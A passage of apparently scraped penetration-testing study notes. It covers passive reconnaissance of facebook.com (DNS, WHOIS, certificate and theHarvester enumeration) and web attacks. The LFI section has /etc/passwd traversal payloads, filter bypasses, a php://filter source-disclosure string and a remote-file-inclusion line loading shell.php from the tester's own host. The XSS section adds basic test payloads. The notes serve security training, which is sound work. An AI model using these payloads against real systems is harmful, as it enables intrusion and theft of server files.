TXT     \"facebook-domain-verification=22rm551cu4k0ab0bxsw536tlds4h95\"\ngoogle.com.             549     IN      MX      20 alt1.aspmx.l.google.com.\ngoogle.com.             3549    IN      TXT     \"docusign=1b0a6754-49b1-4db5-8540-d2c12664b289\"\ngoogle.com.             3549    IN      TXT     \"v=spf1 include:_spf.google.com ~all\"\ngoogle.com.             3549    IN      TXT     \"globalsign-smime-dv=CDYX+XFHUw2wml6/Gb8+59BsH31KzUr6c1l2BPvqKX8=\"\ngoogle.com.             3549    IN      TXT     \"google-site-verification=wD8N7i1JTNTkezJ49swvWW48f8_9xveREV4oB-0Hf5o\"\ngoogle.com.             9       IN      SOA     ns1.google.com. dns-admin.google.com. 403730046 900 900 1800 60\ngoogle.com.             21549   IN      NS      ns1.google.com.\ngoogle.com.             21549   IN      NS      ns3.google.com.\ngoogle.com.             549     IN      MX      50 alt4.aspmx.l.google.com.\ngoogle.com.             3549    IN      TXT     \"docusign=05958488-4752-4ef2-95eb-aa7ba8a3bd0e\"\ngoogle.com.             549     IN      MX      30 alt2.aspmx.l.google.com.\ngoogle.com.             21549   IN      NS      ns2.google.com.\ngoogle.com.             21549   IN      NS      ns4.google.com.\ngoogle.com.             549     IN      MX      40 alt3.aspmx.l.google.com.\ngoogle.com.             3549    IN      TXT     \"MS=E4A68B9AB2BB9670BCE15412F62916164C0B20BB\"\ngoogle.com.             3549    IN      TXT     \"google-site-verification=TV9-DBe4R80X4v0M4U_bd_J9cpOJM0nikft0jAgjmsQ\"\ngoogle.com.             21549   IN      CAA     0 issue \"pki.goog\"\n\n;; Query time: 16 msec\n;; SERVER: 8.8.8.8#53(8.8.8.8)\n;; WHEN: Mo Okt 18 16:15:22 CEST 2021\n;; MSG SIZE  rcvd: 922\n</code></pre> <p>Querying: TXT Records <pre><code>secops@kali[/kali]$ export TARGET=\"facebook.com\"\nsecops@kali[/kali]$ nslookup -query=TXT $TARGET\n\nServer:     1.1.1.1\nAddress:    1.1.1.1#53\n\nNon-authoritative answer:\nfacebook.com    text = \"v=spf1 redirect=_spf.facebook.com\"\nfacebook.com    text = \"google-site-verification=A2WZWCNQHrGV_TWwKh6KHY90tY0SHZo_RnyMJoDaG0s\"\nfacebook.com    text = \"google-site-verification=wdH5DTJTc9AYNwVunSVFeK0hYDGUIEOGb-RReU6pJlY\"\n\nAuthoritative answers can be found from:\n</code></pre></p> <pre><code>secops@kali[/kali]$ dig txt facebook.com @1.1.1.1\n\n; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; txt facebook.com @1.1.1.1\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 63771\n;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n;; QUESTION SECTION:\n;facebook.com.                  IN      TXT\n\n;; ANSWER SECTION:\nfacebook.com.           86400   IN      TXT     \"v=spf1 redirect=_spf.facebook.com\"\nfacebook.com.           7200    IN      TXT     \"google-site-verification=A2WZWCNQHrGV_TWwKh6KHY90tY0SHZo_RnyMJoDaG0s\"\nfacebook.com.           7200    IN      TXT     \"google-site-verification=wdH5DTJTc9AYNwVunSVFeK0hYDGUIEOGb-RReU6pJlY\"\n\n;; Query time: 24 msec\n;; SERVER: 1.1.1.1#53(1.1.1.1)\n;; WHEN: Mo Okt 18 16:17:46 CEST 2021\n;; MSG SIZE  rcvd: 249\n</code></pre> <p>Querying: MX Records <pre><code>secops@kali[/kali]$ export TARGET=\"facebook.com\"\nsecops@kali[/kali]$ nslookup -query=MX $TARGET\n\nServer:     1.1.1.1\nAddress:    1.1.1.1#53\n\nNon-authoritative answer:\nfacebook.com    mail exchanger = 10 smtpin.vvv.facebook.com.\n\nAuthoritative answers can be found from:\n</code></pre></p> <pre><code>secops@kali[/kali]$ dig mx facebook.com @1.1.1.1\n\n; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; mx facebook.com @1.1.1.1\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 9392\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n;; QUESTION SECTION:\n;facebook.com.                  IN      MX\n\n;; ANSWER SECTION:\nfacebook.com.           3600    IN      MX      10 smtpin.vvv.facebook.com.\n\n;; Query time: 40 msec\n;; SERVER: 1.1.1.1#53(1.1.1.1)\n;; WHEN: Mo Okt 18 16:18:22 CEST 2021\n;; MSG SIZE  rcvd: 68\n</code></pre>","title":"DNS"},{"location":"web/info_gathering/passive_info_gathering/passive_infrastructure_identification/","text":"<p>Netcraft can offer us information about the servers without even interacting with them, and this is something valuable from a passive information gathering point of view. We can use the service by visiting <code>https://sitereport.netcraft.com</code> and entering the target domain.</p> <p></p> <p>Some interesting details we can observe from the report are:</p>          <code>Background</code> General information about the domain, including the date it was first seen by Netcraft crawlers.   <code>Network</code> Information about the netblock owner, hosting company, nameservers, etc.   <code>Hosting history</code> Latest IPs used, webserver, and target OS.    <p>We need to pay special attention to the latest IPs used. Sometimes we can spot the actual IP address from the webserver before it was placed behind a load balancer, web application firewall, or IDS, allowing us to connect directly to it if the configuration allows it.</p>","title":"Infrastructure Identification"},{"location":"web/info_gathering/passive_info_gathering/passive_infrastructure_identification/#wayback-machine","text":"<p>We can check one of the first versions of <code>facebook.com</code> captured on December 1, 2005, which is interesting, perhaps gives us a sense of nostalgia but is also extremely useful for us as security researchers.</p> <p></p> <p>We can also use the tool waybackurls to inspect URLs saved by Wayback Machine and look for specific keywords. Provided we have <code>Go</code> set up correctly on our host, we can install the tool as follows:</p> <pre><code>secops@kali[/kali]$ go get github.com/tomnomnom/waybackurls\n</code></pre> <p>To get a list of crawled URLs from a domain with the date it was obtained, we can add the <code>-dates</code> switch to our command as follows:</p> <pre><code>secops@kali[/kali]$ waybackurls -dates https://facebook.com &gt; waybackurls.txt\nsecops@kali[/kali]$ cat waybackurls.txt\n\n2018-05-20T09:46:07Z http://www.facebook.com./\n2018-05-20T10:07:12Z https://www.facebook.com/\n2018-05-20T10:18:51Z http://www.facebook.com/#!/pages/Welcome-Baby/143392015698061?ref=tsrobots.txt\n2018-05-20T10:19:19Z http://www.facebook.com/\n2018-05-20T16:00:13Z http://facebook.com\n2018-05-21T22:12:55Z https://www.facebook.com\n2018-05-22T15:14:09Z http://www.facebook.com\n2018-05-22T17:34:48Z http://www.facebook.com/#!/Syerah?v=info&amp;ref=profile/robots.txt\n2018-05-23T11:03:47Z http://www.facebook.com/#!/Bin595\n\n&lt;SNIP&gt;\n</code></pre>","title":"Wayback Machine"},{"location":"web/info_gathering/passive_info_gathering/passive_subdomain_enum/","text":"","title":"Subdomain Enumeration"},{"location":"web/info_gathering/passive_info_gathering/passive_subdomain_enum/#virustotal","text":"<p>VirusTotal maintains its DNS replication service, which is developed by preserving DNS resolutions made when users visit URLs given by them. To receive information about a domain, type the domain name into the search bar and click on the \"Relations\" tab.</p> <p></p>","title":"VirusTotal"},{"location":"web/info_gathering/passive_info_gathering/passive_subdomain_enum/#certificates","text":"<p>Another interesting source of information we can use to extract subdomains is SSL/TLS certificates.</p> <pre><code>secops@kali[/kali]$ export TARGET=\"facebook.com\"\nsecops@kali[/kali]$ curl -s \"https://crt.sh/?q=${TARGET}&amp;output=json\" | jq -r '.[] | \"\\(.name_value)\\n\\(.common_name)\"' | sort -u &gt; \"${TARGET}_crt.sh.txt\"\n</code></pre> <pre><code>secops@kali[/kali]$ head -n20 facebook.com_crt.sh.txt\n\n*.adtools.facebook.com\n*.ak.facebook.com\n*.ak.fbcdn.net\n*.alpha.facebook.com\n*.assistant.facebook.com\n*.beta.facebook.com\n*.channel.facebook.com\n*.cinyour.facebook.com\n*.cinyourrc.facebook.com\n*.connect.facebook.com\n*.cstools.facebook.com\n*.ctscan.facebook.com\n*.dev.facebook.com\n*.dns.facebook.com\n*.extern.facebook.com\n*.extools.facebook.com\n*.f--facebook.com\n*.facebook.com\n*.facebookcorewwwi.onion\n*.facebookmail.com\n</code></pre>","title":"Certificates"},{"location":"web/info_gathering/passive_info_gathering/passive_subdomain_enum/#automating-passive-subdomain-enumeration","text":"<p>TheHarvester is a simple-to-use yet powerful and effective tool for early-stage penetration testing and red team engagements. We can use it to gather information to help identify a company's attack surface. The tool collects emails, names, subdomains, IP addresses, and URLs from various public data sources for passive information gathering.</p>          Baidu Baidu search engine.   <code>Bufferoverun</code> Uses data from Rapid7's Project Sonar - www.rapid7.com/research/project-sonar/   Crtsh Comodo Certificate search.   Hackertarget Online vulnerability scanners and network intelligence to help organizations.   <code>Otx</code> AlienVault Open Threat Exchange - https://otx.alienvault.com   Rapiddns DNS query tool, which makes querying subdomains or sites using the same IP easy.   <code>Sublist3r</code> Fast subdomains enumeration tool for penetration testers - <code>https://api.sublist3r.com/search.php?domain=example.com</code>   Threatcrowd Open source threat intelligence.   Threatminer Data mining for threat intelligence.   <code>Trello</code> Search Trello boards (Uses Google search)   Urlscan A sandbox for the web that is a URL and website scanner.   <code>Vhost</code> Bing virtual hosts search.   Virustotal Domain search.   Zoomeye A Chinese version of Shodan.    <p>To automate this, create a file called sources.txt</p> <pre><code>secops@kali[/kali]$ cat sources.txt\n\nbaidu\nbufferoverun\ncrtsh\nhackertarget\notx\nprojecdiscovery\nrapiddns\nsublist3r\nthreatcrowd\ntrello\nurlscan\nvhost\nvirustotal\nzoomeye\n</code></pre> <p>Once the file is created, we will execute the following commands to gather information from these sources.</p> <pre><code>secops@kali[/kali]$ export TARGET=\"facebook.com\"\nsecops@kali[/kali]$ cat sources.txt | while read source; do theHarvester -d \"${TARGET}\" -b $source -f \"${source}_${TARGET}\";done\n\n&lt;SNIP&gt;\n*******************************************************************\n*  _   _                                            _             *\n* | |_| |__   ___    /\\  /\\__ _ _ ____   _____  ___| |_ ___ _ __  *\n* | __|  _ \\ / _ \\  / /_/ / _` | '__\\ \\ / / _ \\/ __| __/ _ \\ '__| *\n* | |_| | | |  __/ / __  / (_| | |   \\ V /  __/\\__ \\ ||  __/ |    *\n*  \\__|_| |_|\\___| \\/ /_/ \\__,_|_|    \\_/ \\___||___/\\__\\___|_|    *\n*                                                                 *\n* theHarvester 4.0.0                                              *\n* Coded by Christian Martorella                                   *\n* Edge-Security Research                                          *\n* cmartorella@edge-security.com                                   *\n*                                                                 *\n*******************************************************************\n\n\n[*] Target: facebook.com\n\n[*] Searching Urlscan.\n\n[*] ASNS found: 29\n--------------------\nAS12578\nAS13335\nAS13535\nAS136023\nAS14061\nAS14618\nAS15169\nAS15817\n\n&lt;SNIP&gt;\n</code></pre> <p>When the process finishes, we can extract all the subdomains found and sort them via the following command:</p> <pre><code>secops@kali[/kali]$ cat *.json | jq -r '.hosts[]' 2&gt;/dev/null | cut -d':' -f 1 | sort -u &gt; \"${TARGET}_theHarvester.txt\"\n</code></pre>","title":"Automating Passive Subdomain Enumeration"},{"location":"web/info_gathering/passive_info_gathering/whois/","text":"<pre><code>secops@kali[/kali]$ export TARGET=\"facebook.com\" # Assign our target to an environment variable\nsecops@kali[/kali]$ whois $TARGET\n\nDomain Name: FACEBOOK.COM\nRegistry Domain ID: 2320948_DOMAIN_COM-VRSN\nRegistrar WHOIS Server: whois.registrarsafe.com\nRegistrar URL: https://www.registrarsafe.com\nUpdated Date: 2021-09-22T19:33:41Z\nCreation Date: 1997-03-29T05:00:00Z\nRegistrar Registration Expiration Date: 2030-03-30T04:00:00Z\nRegistrar: RegistrarSafe, LLC\nRegistrar IANA ID: 3237\nRegistrar Abuse Contact Email: abusecomplaints@registrarsafe.com\nRegistrar Abuse Contact Phone: +1.6503087004\nDomain Status: clientDeleteProhibited https://www.icann.org/epp#clientDeleteProhibited\nDomain Status: clientTransferProhibited https://www.icann.org/epp#clientTransferProhibited\nDomain Status: clientUpdateProhibited https://www.icann.org/epp#clientUpdateProhibited\nDomain Status: serverDeleteProhibited https://www.icann.org/epp#serverDeleteProhibited\nDomain Status: serverTransferProhibited https://www.icann.org/epp#serverTransferProhibited\nDomain Status: serverUpdateProhibited https://www.icann.org/epp#serverUpdateProhibited\nRegistry Registrant ID:\nRegistrant Name: Domain Admin\n&lt;SNIP&gt;\n</code></pre> <p>We can gather the same data using <code>whois.exe</code> from Windows Sysinternals: <pre><code>C:\\xyz&gt; whois.exe facebook.com\n\nWhois v1.21 - Domain information lookup\nCopyright (C) 2005-2019 Mark Russinovich\nSysinternals - www.sysinternals.com\n\nConnecting to COM.whois-servers.net...\n\nWHOIS Server: whois.registrarsafe.com\n   Registrar URL: http://www.registrarsafe.com\n   Updated Date: 2021-09-22T19:33:41Z\n   Creation Date: 1997-03-29T05:00:00Z\n   Registry Expiry Date: 2030-03-30T04:00:00Z\n   Registrar: RegistrarSafe, LLC\n   Registrar IANA ID: 3237\n   Registrar Abuse Contact Email: abusecomplaints@registrarsafe.com\n   Registrar Abuse Contact Phone: +1-650-308-7004\n   Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited\n   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited\n   Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited\n   Domain Status: serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited\n   Domain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited\n   Domain Status: serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited\n   Name Server: A.NS.FACEBOOK.COM\n   Name Server: B.NS.FACEBOOK.COM\n   Name Server: C.NS.FACEBOOK.COM\n   Name Server: D.NS.FACEBOOK.COM\n   DNSSEC: unsigned\n   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/\n&gt;&gt;&gt; Last update of whois database: 2021-10-11T06:03:10Z &lt;&lt;&lt;\n\n&lt;SNIP&gt;\n</code></pre></p>","title":"WHOIS"},{"location":"web/lfi/local_file_inclusion/","text":"LFI Tools <p>The most common LFI tools are LFISuite, LFiFreak, and liffy.</p>  Automated Scanning <p>fuzz the page for common <code>GET</code> parameters</p> <pre><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value' -fs 2287\n</code></pre> <p>fuzz the <code>?language=</code> parameter <pre><code>secops@kali[/kali]$ ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ' -fs 2287\n\n...SNIP...\n\n :: Method           : GET\n :: URL              : http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=key\n :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n :: Filter           : Response size: xxx\n________________________________________________\n\n..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]\n../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]\n...SNIP...\n../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]\n../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]\n../../../../../../etc/passwd&amp;=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]\n..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]\n/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]\n</code></pre></p> <p>Server webroot <pre><code>secops@kali[/kali]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php' -fs 2287\n\n...SNIP...\n\n: Method           : GET\n :: URL              : http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response size: 2287\n________________________________________________\n\n/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]\n</code></pre></p> <p>Server Logs/Configurations <pre><code>secops@kali[/kali]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ' -fs 2287\n\n...SNIP...\n\n :: Method           : GET\n :: URL              : http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ\n :: Wordlist         : FUZZ: ./LFI-WordList-Linux\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response size: 2287\n________________________________________________\n\n/etc/hosts              [Status: 200, Size: 2461, Words: 636, Lines: 72]\n/etc/hostname           [Status: 200, Size: 2300, Words: 634, Lines: 66]\n/etc/login.defs         [Status: 200, Size: 12837, Words: 2271, Lines: 406]\n/etc/fstab              [Status: 200, Size: 2324, Words: 639, Lines: 66]\n/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]\n/etc/issue.net          [Status: 200, Size: 2306, Words: 636, Lines: 66]\n...SNIP...\n</code></pre></p>  <p>Basic LFI</p> <pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/etc/passwd\n</code></pre> <pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../etc/passwd\n</code></pre>  <p>Basic Bypasses</p> <pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=....//....//....//....//etc/passwd\n</code></pre> <pre><code>&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64\n</code></pre> <pre><code>&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=./languages/../../../../etc/passwd\n</code></pre>  PHP Filters <p>Fuzzing for PHP Files <pre><code>secops@kali[/kali]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/FUZZ.php\n\n...SNIP...\n\nindex                   [Status: 200, Size: 2652, Words: 690, Lines: 64]\nconfig                  [Status: 302, Size: 0, Words: 1, Lines: 1]\n</code></pre></p> <p>Source Code Disclosure <pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=config\n</code></pre></p>  <p>Remote File Inclusions</p> <pre><code>:http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id\n</code></pre>","title":"Local File Inclusion"},{"location":"web/xss/cross_site_scripting/","text":"Stored XSS <p>Test whether the page is vulnerable to XSS:</p> <pre><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;\n</code></pre>  XSS Discovery <p>Some of the common open-source tools that can assist us in XSS discovery are XSS Strike, Brute XSS, and XSSer.</p> <pre><code>secops@kali[/kali]$ git clone https://github.com/s0md3v/XSStrike.git\nsecops@kali[/kali]$ cd XSStrike\nsecops@kali[/kali]$ pip install -r requirements.txt\nsecops@kali[/kali]$ python xsstrike.py\n\nXSStrike v3.1.4\n...SNIP...\n</code></pre> <p>Reflected XSS example <pre><code>secops@kali[/kali]$ python xsstrike.py -u \"http://SERVER_IP:PORT/index.php?task=test\" \n\n        XSStrike v3.1.4\n\n[~] Checking for DOM vulnerabilities \n[+] WAF Status: Offline \n[!] Testing parameter: task \n[!] Reflections found: 1 \n[~] Analysing reflections \n[~] Generating payloads \n[!] Payloads generated: 3072 \n------------------------------------------------------------\n[+] Payload: &lt;HtMl%09onPoIntERENTER+=+confirm()&gt; \n[!] Efficiency: 100 \n[!] Confidence: 10 \n[?] Would you like to continue scanning? [y/N]\n</code></pre></p>  Manual Discovery <p>The most basic method of looking for XSS vulnerabilities is manually testing various XSS payloads against an input field in a given web page. We can find huge lists of XSS payloads online, like the one on PayloadAllTheThings or the one in PayloadBox. We can then begin testing these payloads one by one by copying each one and adding it in our form, and seeing whether an alert box pops up.</p>","title":"XSS"}]}